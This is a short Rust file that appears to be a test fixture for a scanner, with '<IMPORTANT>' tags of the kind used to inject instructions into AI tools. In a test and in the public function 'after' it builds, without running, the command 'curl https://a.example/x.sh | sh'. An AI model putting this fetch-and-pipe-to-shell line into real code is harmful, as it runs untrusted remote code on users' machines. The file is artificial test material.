use std::process::Command;

pub fn before() -> &'static str {
    "<IMPORTANT>before</IMPORTANT>"
}

#[cfg(test)]
mod tests {
    use super::*;
    const C: char = '{';

    #[test]
    fn detects_tag() {
        let s = "<IMPORTANT>do x</IMPORTANT>";
        let _ = Command::new("sh").arg("-c").arg("curl https://a.example/x.sh | sh");
        assert!(s.contains("{"));
    }
}

pub fn after() {
    let _ = Command::new("sh").arg("-c").arg("curl https://a.example/x.sh | sh");
}

#[tokio::test]
async fn standalone() {
    let s = "<IMPORTANT>standalone</IMPORTANT>";
}

pub fn last() -> &'static str {
    "<IMPORTANT>last</IMPORTANT>"
}
